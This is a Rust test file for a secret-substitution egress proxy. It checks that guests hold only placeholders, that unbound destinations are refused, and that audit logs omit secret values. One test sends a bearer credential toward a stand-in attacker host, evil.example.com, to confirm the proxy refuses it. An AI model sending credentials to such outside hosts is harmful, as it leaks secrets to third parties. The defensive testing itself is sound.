//! Egress no-secret-to-guest leak-gate.
//!
//! A standing, canary-based backstop for the egress substitution model: the
//! raw secret stays on the host, the guest only ever holds an opaque
//! placeholder, and the audit chain carries metadata only. The three tests
//! below pin those invariants so a future refactor of the substitution path
//! can't silently regress them. Each asserts existing behaviour — a failure
//! here is a real leak, not a stale test.
//!
//! The canary is a distinctive sentinel: if it shows up in a guest-facing
//! artifact or the audit chain, the assertion names exactly which surface
//! leaked.

use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD as B64;
use ed25519_dalek::SigningKey;
use secrecy::SecretBox;
use tempfile::tempdir;
use tokio::net::{UnixListener, UnixStream};

use mvm_contract::ir::{AuthType, SecretMount, SecretRef};
use mvm_core::crypto::secret_store::{FileSecretStore, SecretStore};
use mvm_core::plan::{SecretBinding, SecretSource, TenantId};
use mvm_core::substitution_wire::{WireRequest, WireResponse};

use mvm_hostd::framing::{read_json_frame, write_json_frame};
use mvm_hostd::keyholder::{
    BindingStore, FileBindingStore, LocalResolver, SecretBindingMeta, SecretResolver,
    SubstitutionRegistry, secret_placeholder_env,
};
use mvm_hostd::supervisor::audit_file::FileAuditSigner;
use mvm_hostd::supervisor::audit_recorder::Recorder;
use mvm_hostd::supervisor::network_endpoint_proxy::{
    ForwardError, ForwardResponse, Forwarder, FromPlanInputs, PreparedRequest, SubstitutionService,
};

/// The sentinel secret value. It must never appear in a guest-facing artifact
/// (the handed placeholder env) or in the audit chain.
const CANARY: &str = "CANARY-SECRET-VALUE-MUST-NOT-LEAK";

/// 16 MiB — matches the endpoint's framing cap.
const MAX_FRAME_BYTES: usize = 16 * 1024 * 1024;

/// Records the request it was handed so a test can prove the destination — not
/// the guest — received the substituted credential, without a network call.
struct RecordingForwarder {
    seen: Mutex<Option<PreparedRequest>>,
}

#[async_trait]
impl Forwarder for RecordingForwarder {
    async fn forward(&self, req: PreparedRequest) -> Result<ForwardResponse, ForwardError> {
        *self.seen.lock().unwrap() = Some(req);
        Ok(ForwardResponse {
            status: 200,
            headers: vec![("x-mock".into(), "1".into())],
            body: b"pong".to_vec(),
        })
    }
}

fn bearer_ref(name: &str, hosts: &[&str]) -> SecretRef {
    SecretRef {
        name: name.into(),
        mount: SecretMount::Env {
            var: "OPENAI_API_KEY".into(),
        },
        auth_type: AuthType::Bearer,
        allowed_hosts: hosts.iter().map(|h| h.to_string()).collect(),
        sigv4: None,
    }
}

/// (a) The handed `(var, placeholder)` pairs — the artifact injected into the
/// guest's environment — carry only opaque placeholders, never the value. The
/// canary lives in the host secret store; `from_plan` mints placeholders; the
/// canary must appear in NONE of them, and `secret_placeholder_env` (the guest
/// env) must carry the canary in no value.
#[test]
fn handed_placeholders_never_contain_the_secret_value() {
    let dir = tempdir().unwrap();

    // Binding metadata (the `mvmctl secret set` side) + the value store.
    let bindings = FileBindingStore::with_dir(dir.path().join("bindings"));
    bindings
        .put(
            "local",
            "openai",
            &SecretBindingMeta {
                auth_type: AuthType::Bearer,
                allowed_hosts: vec!["api.openai.com".into()],
                sigv4: None,
                provider: None,
            },
        )
        .unwrap();
    let store = FileSecretStore::with_dir(dir.path().join("secrets"));
    store
        .put(
            "local",
            "openai",
            &SecretBox::new(Box::new(CANARY.to_string())),
        )
        .unwrap();
    let secret_store: Arc<dyn SecretStore> = Arc::new(store);
    let resolver: Arc<dyn SecretResolver> = Arc::new(LocalResolver::new("local", secret_store));

    let plan = [SecretBinding {
        name: "OPENAI_API_KEY".into(),
        source: SecretSource::Keystore {
            address: "openai".into(),
        },
    }];
    let (_service, handed) = SubstitutionService::from_plan(FromPlanInputs {
        plan_secrets: &plan,
        tenant: "local",
        instance_id: "",
        ai_policy: None,
        bindings: &bindings,
        resolver,
        forward_timeout_secs: 30,
        proxy: None,
        redaction: mvm_core::policy::RedactionPolicy::default(),
        reversible_replacement: mvm_core::policy::ReversibleReplacementPolicy::default(),
        tls_intermediate: None,
        recorder: None,
    })
    .unwrap();

    assert!(
        !handed.is_empty(),
        "expected at least one handed placeholder"
    );
    for (var, placeholder) in &handed {
        assert!(
            placeholder.as_str().starts_with("mvm-secret-"),
            "handed placeholder for `{var}` is not an opaque token: {}",
            placeholder.as_str()
        );
        assert!(
            !placeholder.as_str().contains(CANARY),
            "LEAK: handed placeholder for `{var}` carries the secret value"
        );
    }

    // The guest env (the actual artifact injected at launch) carries only
    // placeholders — the canary appears in no value.
    let env = secret_placeholder_env(&handed);
    assert!(!env.is_empty(), "expected at least one guest env entry");
    for (var, value) in &env {
        assert!(
            value.starts_with("mvm-secret-"),
            "guest env `{var}` is not an opaque placeholder: {value}"
        );
        assert!(
            !value.contains(CANARY),
            "LEAK: guest env value for `{var}` carries the secret value"
        );
    }
}

/// (b) claim 12 — substitution fires only for bound destinations. A placeholder
/// bound to host A, routed to host B, is refused before the forward leg, and
/// the forwarder never sees the request. Mirrors the in-module
/// `endpoint_refuses_unbound_destination_and_never_forwards` over the public
/// service surface, as the standing leak-gate witness.
#[tokio::test]
async fn network_endpoint_refuses_unbound_destination() {
    let dir = tempdir().unwrap();
    let store = FileSecretStore::with_dir(dir.path().join("secrets"));
    store
        .put(
            "local",
            "openai",
            &SecretBox::new(Box::new(CANARY.to_string())),
        )
        .unwrap();
    let resolver: Arc<dyn SecretResolver> = Arc::new(LocalResolver::new("local", Arc::new(store)));

    let mut reg = SubstitutionRegistry::new();
    // Bound to host A only.
    let ph = reg
        .mint(bearer_ref("openai", &["api.openai.com"]))
        .as_str()
        .to_string();
    let forwarder = Arc::new(RecordingForwarder {
        seen: Mutex::new(None),
    });
    let service = Arc::new(SubstitutionService::new(
        Arc::new(reg),
        resolver,
        Arc::clone(&forwarder) as _,
    ));

    let sock = dir.path().join("subst.sock");
    let listener = UnixListener::bind(&sock).unwrap();
    let server = tokio::spawn(Arc::clone(&service).serve(listener));

    let mut client = UnixStream::connect(&sock).await.unwrap();
    // Bound placeholder, but pointed at host B (unbound for this secret).
    let wire = WireRequest {
        method: "POST".into(),
        url: "https://evil.example.com/x".into(),
        headers: vec![("authorization".into(), format!("Bearer {ph}"))],
        body_b64: String::new(),
    };
    write_json_frame(&mut client, &wire).await.unwrap();
    let resp: WireResponse = read_json_frame(&mut client, MAX_FRAME_BYTES).await.unwrap();

    assert!(
        matches!(resp, WireResponse::Refused { .. }),
        "unbound destination must be refused: {resp:?}"
    );
    // claim 12: the unbound destination never reached the forward leg, so the
    // real credential was never substituted toward it.
    assert!(
        forwarder.seen.lock().unwrap().is_none(),
        "LEAK: an unbound destination reached the forward leg"
    );
    server.abort();
}

/// (c) claim 13 — the audit chain carries no secret bytes. Drive a successful
/// substitution with a recorder + the canary secret; the chain must record the
/// `secret.substituted` event (metadata) but never the canary value.
#[tokio::test]
async fn audit_chain_carries_no_secret_value() {
    let dir = tempdir().unwrap();
    let store = FileSecretStore::with_dir(dir.path().join("secrets"));
    store
        .put(
            "local",
            "openai",
            &SecretBox::new(Box::new(CANARY.to_string())),
        )
        .unwrap();
    let resolver: Arc<dyn SecretResolver> = Arc::new(LocalResolver::new("local", Arc::new(store)));

    let mut reg = SubstitutionRegistry::new();
    let ph = reg
        .mint(bearer_ref("openai", &["api.openai.com"]))
        .as_str()
        .to_string();
    let forwarder = Arc::new(RecordingForwarder {
        seen: Mutex::new(None),
    });

    let chain = dir.path().join("audit.jsonl");
    let signer = FileAuditSigner::open_file(SigningKey::from_bytes(&[9u8; 32]), &chain).unwrap();
    let recorder = Recorder::new(Arc::new(signer), TenantId("local".into()));

    let service = Arc::new(
        SubstitutionService::new(Arc::new(reg), resolver, Arc::clone(&forwarder) as _)
            .with_recorder(recorder),
    );
    let sock = dir.path().join("subst.sock");
    let listener = UnixListener::bind(&sock).unwrap();
    let server = tokio::spawn(Arc::clone(&service).serve(listener));

    let mut client = UnixStream::connect(&sock).await.unwrap();
    let wire = WireRequest {
        method: "POST".into(),
        url: "https://api.openai.com/v1".into(),
        headers: vec![("authorization".into(), format!("Bearer {ph}"))],
        body_b64: B64.encode(b"{}"),
    };
    write_json_frame(&mut client, &wire).await.unwrap();
    // The audit emit completes before the Ok response is written, so the chain
    // entry is on disk by the time the reply lands.
    let resp: WireResponse = read_json_frame(&mut client, MAX_FRAME_BYTES).await.unwrap();
    assert!(
        matches!(resp, WireResponse::Ok { .. }),
        "bound substitution must succeed: {resp:?}"
    );

    // The destination (forwarder) — not the guest — saw the real credential.
    let seen = forwarder.seen.lock().unwrap().clone().unwrap();
    assert_eq!(
        seen.headers[0],
        ("authorization".into(), format!("Bearer {CANARY}"))
    );

    let logged = std::fs::read_to_string(&chain).unwrap();
    assert!(
        logged.contains("secret.substituted"),
        "expected a secret.substituted audit entry: {logged}"
    );
    // claim 13: the value never reaches the audit chain.
    assert!(
        !logged.contains(CANARY),
        "LEAK: audit chain carries the secret value: {logged}"
    );
    server.abort();
}
